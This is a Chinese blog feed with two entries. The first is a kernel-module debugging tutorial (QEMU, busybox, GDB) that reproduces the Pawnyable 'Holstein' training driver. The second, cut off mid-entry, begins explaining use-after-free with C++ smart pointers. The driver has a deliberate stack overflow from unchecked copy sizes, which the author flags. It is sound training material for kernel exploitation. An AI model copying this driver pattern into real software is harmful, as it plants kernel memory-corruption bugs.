<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="cn"><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="https://leakbox258.github.io/feed.xml" rel="self" type="application/atom+xml"/><link href="https://leakbox258.github.io/" rel="alternate" type="text/html" hreflang="cn"/><updated>2025-09-10T09:18:40+00:00</updated><id>https://leakbox258.github.io/feed.xml</id><title type="html">blank</title><subtitle>A simple, whitespace theme for academics. Based on [*folio](https://github.com/bogoli/-folio) design. </subtitle><entry><title type="html">内核模块开发环境及调试</title><link href="https://leakbox258.github.io/blog/2025/%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E5%8F%8A%E8%B0%83%E8%AF%95/" rel="alternate" type="text/html" title="内核模块开发环境及调试"/><published>2025-02-24T00:00:00+00:00</published><updated>2025-02-24T00:00:00+00:00</updated><id>https://leakbox258.github.io/blog/2025/%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E5%8F%8A%E8%B0%83%E8%AF%95</id><content type="html" xml:base="https://leakbox258.github.io/blog/2025/%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E5%8F%8A%E8%B0%83%E8%AF%95/"><![CDATA[<p>ps: OS课用</p> <h2 id="qemu虚拟机">Qemu虚拟机</h2> <h4 id="-qemu下载">  qemu下载</h4> <h5 id="直接apt下一个即可-建议使用模拟x86的qemu-这样可以避免使用交叉编译器">   直接apt下一个即可, 建议使用模拟x86的qemu, 这样可以避免使用交叉编译器<br/></h5> <h4 id="-direct-linux-boot">  Direct Linux Boot</h4> <h5 id="一方面-可以使用qemu-img制作一个镜像-然后用qemu模拟运行">   一方面, 可以使用<code class="language-plaintext highlighter-rouge">qemu-img</code>制作一个镜像, 然后用<code class="language-plaintext highlighter-rouge">qemu</code>模拟运行<br/></h5> <h5 id="qemu支持所谓直接引导linux内核direct-linux-boot的方式启动虚拟机-更适合内核的测试-httpswwwqemuorgdocsmastersystemlinuxboothtml">   <code class="language-plaintext highlighter-rouge">qemu</code>支持所谓”直接引导Linux内核(Direct Linux Boot)”的方式启动虚拟机, 更适合内核的测试 https://www.qemu.org/docs/master/system/linuxboot.html</h5> <h5 id="此种方式需要准备三个部分">   此种方式需要准备三个部分:</h5> <h5 id="1-一个压缩的linux内核镜像-俗称bzimage2-一个临时根文件系统initrd3指定根文件设备的挂载-如果initrd已经是一个可用的文件系统-则此处省略">    1. 一个压缩的Linux内核镜像, 俗称bzImage<br/>    2. 一个临时根文件系统initrd<br/>    3.指定根文件设备的挂载, 如果initrd已经是一个可用的文件系统, 则此处省略</h5> <h5 id="此外这种方式还支持gdb-attach-是之后主要的调试方法">    此外这种方式还支持<code class="language-plaintext highlighter-rouge">gdb-attach</code>, 是之后主要的调试方法</h5> <h2 id="准备开发环境">准备开发环境</h2> <h4 id="linux-headers"> linux-headers</h4> <h5 id="内核模块的编译和构建需要一些特定的宏-数据结构以及函数-这些东西常用的头文件中没有-需要下载专门的linux-headers">   内核模块的编译和构建需要一些特定的宏, 数据结构以及函数, 这些东西常用的头文件中没有, 需要下载专门的<code class="language-plaintext highlighter-rouge">linux-headers</code><br/></h5> <h5 id="如果你的apt或者别的什么包管理器可以直接下载对应版本的linux-headers-但极有可能是找不到的">   如果你的apt或者别的什么包管理器可以直接下载对应版本的<code class="language-plaintext highlighter-rouge">linux-headers</code>, 但极有可能是找不到的<br/></h5> <h5 id="首先从httpswwwkernelorg-下一个linux-61129tarxz-或者curl--o--l-httpsmirrorstunatsinghuaeducnkernelv5xlinux-61129tarxz">   首先从https://www.kernel.org/, 下一个linux-6.1.129.tar.xz; 或者<code class="language-plaintext highlighter-rouge">curl -O -L https://mirrors.tuna.tsinghua.edu.cn/kernel/v5.x/linux-6.1.129.tar.xz</code></h5> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ unxz linux-6.1.129.tar.xz
$ tar -xf linux-6.1.129.tar
</code></pre></div></div> <h5 id="进入源码目录之后-make-menuconfig进入图形化配置界面需要全屏-勾选以下内容">   进入源码目录之后, <code class="language-plaintext highlighter-rouge">make menuconfig</code>进入图形化配置界面(需要全屏), 勾选以下内容</h5> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># 便于调试
Kernel hacking -&gt; Compile-time checks and compiler options -&gt; Debug information (Disable debug information) -&gt; Rely on the toolchain's implicit default DWARF version
Kernel hacking -&gt; Generic Kernel Debugging Instruments -&gt; KGDB: kernel debugger
# 兼容initrd
File systems -&gt; Second extended fs support -&gt; Ext2 extended attributes
</code></pre></div></div> <h5 id="然后执行make-prepare和make-modules_prepare-理论上只用make-modules_prepare即可-但是没试过">   然后执行<code class="language-plaintext highlighter-rouge">make prepare</code>和<code class="language-plaintext highlighter-rouge">make modules_prepare</code>, 理论上只用<code class="language-plaintext highlighter-rouge">make modules_prepare</code>即可, 但是没试过<br/></h5> <h5 id="然后执行make-modules--jnproc-这一步是主要为了生成modulesymvers-这样才能使用一些内核函数">   然后执行<code class="language-plaintext highlighter-rouge">make modules -j$(nproc)</code>, 这一步是主要为了生成<code class="language-plaintext highlighter-rouge">Module.symvers</code>, 这样才能使用一些内核函数<br/></h5> <h4 id="编译与构建举例"> 编译与构建举例</h4> <h5 id="以下是一个字符型内核模块的示例-模块名为holstein">   以下是一个字符型内核模块的示例, 模块名为holstein<br/></h5> <h5 id="来自httpspawnyablecafelinux-kernel">   来自https://pawnyable.cafe/linux-kernel/<br/></h5> <h5 id="警告-这是一个有严重漏洞的模块-请不要尝试挂载它">   警告: 这是一个有严重漏洞的模块, 请不要尝试挂载它.<br/></h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;linux/cdev.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;linux/fs.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;linux/kernel.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;linux/module.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;linux/slab.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;linux/uaccess.h&gt;</span><span class="cp">
</span>
<span class="n">MODULE_LICENSE</span><span class="p">(</span><span class="s">"GPL"</span><span class="p">);</span>
<span class="n">MODULE_AUTHOR</span><span class="p">(</span><span class="s">"ptr-yudai"</span><span class="p">);</span>
<span class="n">MODULE_DESCRIPTION</span><span class="p">(</span><span class="s">"Holstein v1 - Vulnerable Kernel Driver for Pawnyable"</span><span class="p">);</span>

<span class="cp">#define DEVICE_NAME "holstein"
#define BUFFER_SIZE 0x400
</span>
<span class="kt">char</span> <span class="o">*</span><span class="n">g_buf</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

<span class="k">static</span> <span class="kt">int</span> <span class="nf">module_open</span><span class="p">(</span><span class="k">struct</span> <span class="n">inode</span> <span class="o">*</span><span class="n">inode</span><span class="p">,</span> <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">printk</span><span class="p">(</span><span class="n">KERN_INFO</span> <span class="s">"module_open called</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

  <span class="n">g_buf</span> <span class="o">=</span> <span class="n">kmalloc</span><span class="p">(</span><span class="n">BUFFER_SIZE</span><span class="p">,</span> <span class="n">GFP_KERNEL</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">g_buf</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printk</span><span class="p">(</span><span class="n">KERN_INFO</span> <span class="s">"kmalloc failed"</span><span class="p">);</span>
    <span class="k">return</span> <span class="o">-</span><span class="n">ENOMEM</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">ssize_t</span> <span class="nf">module_read</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span> <span class="kt">char</span> <span class="n">__user</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">count</span><span class="p">,</span>
                           <span class="n">loff_t</span> <span class="o">*</span><span class="n">f_pos</span><span class="p">)</span> <span class="p">{</span>
  <span class="kt">char</span> <span class="n">kbuf</span><span class="p">[</span><span class="n">BUFFER_SIZE</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>

  <span class="n">printk</span><span class="p">(</span><span class="n">KERN_INFO</span> <span class="s">"module_read called</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

  <span class="n">memcpy</span><span class="p">(</span><span class="n">kbuf</span><span class="p">,</span> <span class="n">g_buf</span><span class="p">,</span> <span class="n">BUFFER_SIZE</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">_copy_to_user</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">kbuf</span><span class="p">,</span> <span class="n">count</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">printk</span><span class="p">(</span><span class="n">KERN_INFO</span> <span class="s">"copy_to_user failed</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="k">return</span> <span class="n">count</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">ssize_t</span> <span class="nf">module_write</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="n">__user</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span>
                            <span class="kt">size_t</span> <span class="n">count</span><span class="p">,</span> <span class="n">loff_t</span> <span class="o">*</span><span class="n">f_pos</span><span class="p">)</span> <span class="p">{</span>
  <span class="kt">char</span> <span class="n">kbuf</span><span class="p">[</span><span class="n">BUFFER_SIZE</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>

  <span class="n">printk</span><span class="p">(</span><span class="n">KERN_INFO</span> <span class="s">"module_write called</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">_copy_from_user</span><span class="p">(</span><span class="n">kbuf</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">count</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">printk</span><span class="p">(</span><span class="n">KERN_INFO</span> <span class="s">"copy_from_user failed</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">memcpy</span><span class="p">(</span><span class="n">g_buf</span><span class="p">,</span> <span class="n">kbuf</span><span class="p">,</span> <span class="n">BUFFER_SIZE</span><span class="p">);</span>

  <span class="k">return</span> <span class="n">count</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">int</span> <span class="nf">module_close</span><span class="p">(</span><span class="k">struct</span> <span class="n">inode</span> <span class="o">*</span><span class="n">inode</span><span class="p">,</span> <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">printk</span><span class="p">(</span><span class="n">KERN_INFO</span> <span class="s">"module_close called</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="n">kfree</span><span class="p">(</span><span class="n">g_buf</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="k">struct</span> <span class="n">file_operations</span> <span class="n">module_fops</span> <span class="o">=</span> <span class="p">{</span>
    <span class="p">.</span><span class="n">owner</span> <span class="o">=</span> <span class="n">THIS_MODULE</span><span class="p">,</span>
    <span class="p">.</span><span class="n">read</span> <span class="o">=</span> <span class="n">module_read</span><span class="p">,</span>
    <span class="p">.</span><span class="n">write</span> <span class="o">=</span> <span class="n">module_write</span><span class="p">,</span>
    <span class="p">.</span><span class="n">open</span> <span class="o">=</span> <span class="n">module_open</span><span class="p">,</span>
    <span class="p">.</span><span class="n">release</span> <span class="o">=</span> <span class="n">module_close</span><span class="p">,</span>
<span class="p">};</span>

<span class="k">static</span> <span class="n">dev_t</span> <span class="n">dev_id</span><span class="p">;</span>
<span class="k">static</span> <span class="k">struct</span> <span class="n">cdev</span> <span class="n">c_dev</span><span class="p">;</span>

<span class="k">static</span> <span class="kt">int</span> <span class="n">__init</span> <span class="nf">module_initialize</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">alloc_chrdev_region</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dev_id</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">DEVICE_NAME</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">printk</span><span class="p">(</span><span class="n">KERN_WARNING</span> <span class="s">"Failed to register device</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="k">return</span> <span class="o">-</span><span class="n">EBUSY</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="n">cdev_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">c_dev</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">module_fops</span><span class="p">);</span>
  <span class="n">c_dev</span><span class="p">.</span><span class="n">owner</span> <span class="o">=</span> <span class="n">THIS_MODULE</span><span class="p">;</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">cdev_add</span><span class="p">(</span><span class="o">&amp;</span><span class="n">c_dev</span><span class="p">,</span> <span class="n">dev_id</span><span class="p">,</span> <span class="mi">1</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">printk</span><span class="p">(</span><span class="n">KERN_WARNING</span> <span class="s">"Failed to add cdev</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">unregister_chrdev_region</span><span class="p">(</span><span class="n">dev_id</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
    <span class="k">return</span> <span class="o">-</span><span class="n">EBUSY</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="n">__exit</span> <span class="nf">module_cleanup</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">cdev_del</span><span class="p">(</span><span class="o">&amp;</span><span class="n">c_dev</span><span class="p">);</span>
  <span class="n">unregister_chrdev_region</span><span class="p">(</span><span class="n">dev_id</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>

<span class="n">module_init</span><span class="p">(</span><span class="n">module_initialize</span><span class="p">);</span>
<span class="n">module_exit</span><span class="p">(</span><span class="n">module_cleanup</span><span class="p">);</span>
</code></pre></div></div> <h5 id="首先-为了简写include-需要配置includepath-具体因ide而异">   首先, 为了简写include, 需要配置includePath, 具体因IDE而异<br/></h5> <h5 id="然后-编写makefile-kernel-module的makefile有特殊语法">   然后, 编写Makefile, kernel Module的Makefile有特殊语法</h5> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>BUILD_DIR := build
obj-m := holstein.o
KBUILD_DIR := ../_kernel/linux-6.1.129
CFLAGS_holstein.o := -O0

all:
	@mkdir -p $(BUILD_DIR)
	$(MAKE) -C $(KBUILD_DIR) M=$(shell pwd) modules
	find . -maxdepth 1 -type f ! -name '*.ko' ! -name 'Makefile' ! -name '*.c' ! -name 'build' -exec mv {} build \;

clean:
	$(MAKE) -C $(KBUILD_DIR) M=$(shell pwd) clean

	rm -rf $(BUILD_DIR)
</code></pre></div></div> <h5 id="编译完成之后-出现的holsteinko就是编译后的模块">   编译完成之后, 出现的<code class="language-plaintext highlighter-rouge">holstein.ko</code>就是编译后的模块</h5> <h2 id="编译内核">编译内核</h2> <h5 id="在上述源码文件夹中-使用make-menuconfig配置之后-即可开始编译内核">   在上述源码文件夹中, 使用<code class="language-plaintext highlighter-rouge">make menuconfig</code>配置之后, 即可开始编译内核</h5> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ make -j$(nproc) bzImage
</code></pre></div></div> <h5 id="编译完成之后-会通知镜像的路径">   编译完成之后, 会通知镜像的路径</h5> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Kernel: arch/x86/boot/bzImage is ready  (#1)
</code></pre></div></div> <h2 id="编译busybox">编译busybox</h2> <h5 id="现在还缺少一个initrd-使用busybox获取-通过busybox可以获取一个带文件系统的rootfs">   现在还缺少一个initrd, 使用busybox获取, 通过busybox可以获取一个带文件系统的rootfs<br/></h5> <h5 id="从httpsbusyboxnet-下载busybox源代码或者wget-httpsbusyboxnetdownloadsbusybox-1370tarbz2">   从<code class="language-plaintext highlighter-rouge">https://busybox.net/</code>, 下载busybox源代码或者<code class="language-plaintext highlighter-rouge">wget https://busybox.net/downloads/busybox-1.37.0.tar.bz2</code></h5> <h5 id="解压并配置">   解压并配置</h5> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tar -vxf busybox-1.37.0.tar.bz2
cd busybox-1.37.0
make menuconfig
</code></pre></div></div> <h5 id="-setttings-选中-build-static-binary-no-shared-libs-使其编译成静态链接的文件-因为bzimage内核本身不提供glibc">    Setttings 选中 Build static binary (no shared libs), 使其编译成静态链接的文件, 因为bzImage内核本身不提供glibc<br/></h5> <h5 id="-然后执行make-install--jnproc-当前文件夹会出现名为_install的文件夹">    然后执行<code class="language-plaintext highlighter-rouge">make install -j$(nproc)</code>, 当前文件夹会出现名为<code class="language-plaintext highlighter-rouge">_install</code>的文件夹<br/></h5> <h5 id="进入文件夹-添加一些东西-并且把编译出的holsteinko放进去">   进入文件夹, 添加一些东西, 并且把编译出的<code class="language-plaintext highlighter-rouge">holstein.ko</code>放进去</h5> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ mkdir -p  proc sys dev etc/init.d
</code></pre></div></div> <h5 id="在文件夹下新建一个init文件-写入如下内容作为初始化脚本-初始化系统环境-上面的新建文件夹的操作也可以放在这个脚本里">   在文件夹下新建一个<code class="language-plaintext highlighter-rouge">init</code>文件, 写入如下内容作为初始化脚本, 初始化系统环境, 上面的新建文件夹的操作也可以放在这个脚本里</h5> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/bin/sh

echo "INIT SCRIPT"
mkdir /tmp
mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs none /dev
mount -t debugfs none /sys/kernel/debug
mount -t tmpfs none /tmp
echo -e "Boot took $(cut -d' ' -f1 /proc/uptime) seconds"
insmod holstein.ko
setsid /bin/cttyhack setuidgid 1000 /bin/sh
</code></pre></div></div> <h5 id="然后打包">   然后打包</h5> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cd _install
$ find . | cpio -o --format=newc &gt; ../rootfs.cpio
</code></pre></div></div> <h5 id="获得一个rootfscpio">   获得一个<code class="language-plaintext highlighter-rouge">rootfs.cpio</code></h5> <h2 id="启动qemu">启动Qemu</h2> <h5 id="在做完了上述工作之后-编写一个用于启动qemu的脚本">   在做完了上述工作之后, 编写一个用于启动Qemu的脚本</h5> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/bin/sh

qemu-system-x86_64 \
    -m 64M \
    -nographic \
    -kernel ./bzImage-6.1 \
    -append "root=/dev/ram console=ttyS0 loglevel=3 oops=panic panic=1 pti=on nokaslr" \
    -no-reboot \
    -cpu kvm64 \
    -S \
    -gdb tcp::1234 \
    -smp cores=2,threads=1 \
    -monitor /dev/null \
    -initrd rootfs.cpio \
    -net nic,model=virtio \
    -net user \
    -enable-kvm \
</code></pre></div></div> <h5 id="看看模块是否挂上了">   看看模块是否挂上了</h5> <p><img src="https://www.helloimg.com/i/2025/02/24/67bc3cd779db2.png" alt="Screenshot 2025-02-24 174107.png"/></p> <h5 id="由于权限不够-所以这里显示不了挂载到的地址">   由于权限不够, 所以这里显示不了挂载到的地址<br/></h5> <h2 id="调试">调试</h2> <h5 id="qemu的启动参数加上-append-nokaslr-关闭内核地址随机化-保证地址在每次启动之后保持不变">   <code class="language-plaintext highlighter-rouge">qemu</code>的启动参数加上<code class="language-plaintext highlighter-rouge">-append "nokaslr"</code>, 关闭内核地址随机化, 保证地址在每次启动之后保持不变</h5> <h5 id="在内核源码文件夹下有一个名为vmlinux的文件-是内核的符号表-用的上的用不上的都在里面">   在内核源码文件夹下有一个名为<code class="language-plaintext highlighter-rouge">vmlinux</code>的文件, 是内核的符号表, 用的上的用不上的都在里面.</h5> <h5 id="启动参数中的-gdb-tcp1234-指的是本地的端口12345--s参数会在qemu启动虚拟机后立即将其挂起-方便调试">   启动参数中的<code class="language-plaintext highlighter-rouge">-gdb tcp::1234</code>, 指的是本地的端口12345, <code class="language-plaintext highlighter-rouge">-S</code>参数会在qemu启动虚拟机后立即将其挂起, 方便调试<br/></h5> <h5 id="在另一个窗口中使用-加载符号表-下断点">   在另一个窗口中使用: 加载符号表, 下断点</h5> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gdb -q -ex "target remote localhost:1234" 
(gdb) set architecture i386:x86-64 # 可选
(gdb) add-symbol-file vmlinux
(gdb) 
(gdb) b start_kernel
</code></pre></div></div> <h5 id="结果差不多是下面这种">   结果差不多是下面这种</h5> <p><img src="https://www.helloimg.com/i/2025/02/24/67bc4a994eb6c.png" alt="63b68857-6543-4031-b299-d624a29bf77e.png"/></p> <h5 id="调试模块">   调试模块:</h5> <h5 id="init脚本改成root用户启动">   <code class="language-plaintext highlighter-rouge">init</code>脚本改成root用户启动</h5> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>setsid /bin/cttyhack setuidgid 0 /bin/sh
</code></pre></div></div> <h5 id="命令行获取模块加载地址">   命令行获取模块加载地址</h5> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># lsmod
holstein 16384 0 - Live 0xffffffffc0000000 (O)
</code></pre></div></div> <h5 id="加载符号表-断点">   加载符号表, 断点</h5> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(gdb) add-symbol-file holstein.ko 0xffffffffc0000000
(gdb) b module_read
</code></pre></div></div> <p><img src="https://www.helloimg.com/i/2025/02/24/67bc621759279.png" alt="Screenshot 2025-02-24 202026.png"/></p> <h5 id="对照一下地址是否一致">   对照一下地址是否一致</h5> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># grep module_read /proc/kallsyms
</code></pre></div></div> <p><img src="https://www.helloimg.com/i/2025/02/24/67bc625a75b11.png" alt="Screenshot 2025-02-24 202033.png"/></p> <h5 id="看起来有点蠢-但是也没找到更好的调试方法了">   看起来有点蠢, 但是也没找到更好的调试方法了<br/></h5> <h5 id="据说gef插件会方便一些">   据说gef插件会方便一些(</h5>]]></content><author><name>久菜合子</name></author><category term="env"/><category term="dev"/><summary type="html"><![CDATA[ps: OS课用]]></summary></entry><entry><title type="html">[水贴]C++应该怎么UAF</title><link href="https://leakbox258.github.io/blog/2025/C++%E6%80%8E%E4%B9%88UAF/" rel="alternate" type="text/html" title="[水贴]C++应该怎么UAF"/><published>2025-01-24T00:00:00+00:00</published><updated>2025-01-24T00:00:00+00:00</updated><id>https://leakbox258.github.io/blog/2025/C++%E6%80%8E%E4%B9%88UAF</id><content type="html" xml:base="https://leakbox258.github.io/blog/2025/C++%E6%80%8E%E4%B9%88UAF/"><![CDATA[<p>ps1: UAF方法不全面, 没写不代表不能用或者没有<br/> ps2: 尽量避免裸指针出现, 只在模拟漏洞(各种任意写)时使用裸指针达到目的, 也就是非必要不用<code class="language-plaintext highlighter-rouge">.get()</code></p> <h2 id="智能指针">智能指针</h2> <h5 id="智能指针是c的常用特性之一-用于解决c语言以及早期c中的内存分配和释放过于复杂-或者内存泄露的问题一般使用的智能指针有stdunique_ptr-stdshared_ptr-stdweak_ptr-stdweak_ptr可以看作是stdshared_ptr在特定情况下的补充-需要include-memory然而-即使有智能指针-也不能高枕无忧-因为内存问题是所有人都要面对的-除非你是高贵的数据分析科学家-或者你使用语言yuan神rust下面简单列一下本人发现的可以对智能指针uaf的方法">   智能指针是C++的常用特性之一, 用于解决C语言以及早期C++中的内存分配和释放过于复杂, 或者内存泄露的问题.<br/>   一般使用的智能指针有<code class="language-plaintext highlighter-rouge">std::unique_ptr, std::shared_ptr, std::weak_ptr</code>, <code class="language-plaintext highlighter-rouge">std::weak_ptr</code>可以看作是<code class="language-plaintext highlighter-rouge">std::shared_ptr</code>在特定情况下的补充. 需要<code class="language-plaintext highlighter-rouge">#include &lt;memory&gt;</code>.<br/>   然而, 即使有智能指针, 也不能高枕无忧, 因为内存问题是所有人都要面对的, 除非你是高贵的数据分析科学家, 或者你使用语言(yu’an)神Rust<br/>   下面简单列一下本人发现的可以对智能指针UAF的方法.</h5> <h2 id="shared_ptr">shared_ptr</h2> <h3 id="内存回收方式"> 内存回收方式<br/></h3> <h5 id="shared_ptr是比较常用的智能指针-一块堆内存可以被多个若干个shared_ptr指向-这块内存会记录被指向的数目引用计数shared_count-当引用归零时-内存被释放-表面上看是这样的实际上stdmake_shared分配的内存有两个计数器-shared_count和weak_count各4字节-当然是为了配合weak_ptr使用">   <code class="language-plaintext highlighter-rouge">shared_ptr</code>是比较常用的智能指针, 一块堆内存可以被多个若干个<code class="language-plaintext highlighter-rouge">shared_ptr</code>指向, 这块内存会记录被指向的数目(引用计数shared_count), 当引用归零时, 内存被释放. 表面上看是这样的.<br/>   实际上<code class="language-plaintext highlighter-rouge">std::make_shared&lt;&gt;</code>分配的内存有两个计数器, <code class="language-plaintext highlighter-rouge">shared_count和weak_count</code>(各4字节), 当然是为了配合<code class="language-plaintext highlighter-rouge">weak_ptr</code>使用<br/></h5> <h5 id="那么shared_ptr在内存中是什么样的的组织方式-下面一个demo">   那么<code class="language-plaintext highlighter-rouge">shared_ptr</code>在内存中是什么样的的组织方式, 下面一个demo</h5> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;memory&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
    <span class="p">{</span>
        <span class="n">std</span><span class="o">::</span><span class="n">shared_ptr</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span> <span class="n">ptr1</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="n">make_shared</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span><span class="p">(</span><span class="mh">0x12345678</span><span class="p">);</span>
        <span class="n">std</span><span class="o">::</span><span class="n">shared_ptr</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span> <span class="n">ptr2</span> <span class="o">=</span> <span class="n">ptr1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <p><img src="https://www.helloimg.com/i/2025/01/24/6793ad0a07ea8.png" alt="Screenshot 2025-01-24 231137.png"/></p> <h5 id="上图是ptr2--ptr1之后的栈空间">   上图是<code class="language-plaintext highlighter-rouge">ptr2 = ptr1</code>之后的栈空间</h5> <h5 id="可以看到其实比较简单-shared_ptr对象本身是-地址指针--一个虚表指针">   可以看到其实比较简单, <code class="language-plaintext highlighter-rouge">shared_ptr</code>对象本身是 <code class="language-plaintext highlighter-rouge">地址(指针) + 一个虚表指针</code></h5> <p><img src="https://www.helloimg.com/i/2025/01/24/6793ae2a45c2a.png" alt="Screenshot 2025-01-24 231631.png"/></p> <h5 id="上述指针即get获取的裸指针指向的一个chunk的中间部分-对象的位置-前面的是0x555555557cc8虚表地址-和0x1weak_count-0x2shared_countuse-count值得一提的是weak_count返回的是0-但实际上在内存中存的是1-在之后提到的weak_count指的是内存中的weak_count">   上述指针(即<code class="language-plaintext highlighter-rouge">.get()</code>获取的裸指针)指向的一个<code class="language-plaintext highlighter-rouge">chunk</code>的中间部分, 对象的位置. 前面的是<code class="language-plaintext highlighter-rouge">0x555555557cc8</code>虚表地址, 和<code class="language-plaintext highlighter-rouge">0x1</code>weak_count, <code class="language-plaintext highlighter-rouge">0x2</code>shared_count(use count).<br/>   值得一提的是weak_count返回的是0, 但实际上在内存中存的是1, 在之后提到的weak_count指的是内存中的weak_count</h5> <h5 id="作用域结束之后-分别对两个stdshared_ptr对象进行析构">   作用域结束之后, 分别对两个<code class="language-plaintext highlighter-rouge">std::shared_ptr</code>对象进行析构<br/></h5> <h5 id="第一个析构之后-堆肯定是没有释放的-但是use-count变成了0x1">   第一个析构之后, 堆肯定是没有释放的, 但是use count变成了<code class="language-plaintext highlighter-rouge">0x1</code><br/></h5> <h5 id="然后追踪一下第二个析构">   然后追踪一下第二个析构</h5> <p><img src="https://www.helloimg.com/i/2025/01/24/6793b05b77e6a.png" alt="Screenshot 2025-01-24 213734.png"/></p> <h5 id="注意下面的调用栈-现在在_m_release中">   注意下面的调用栈, 现在在<code 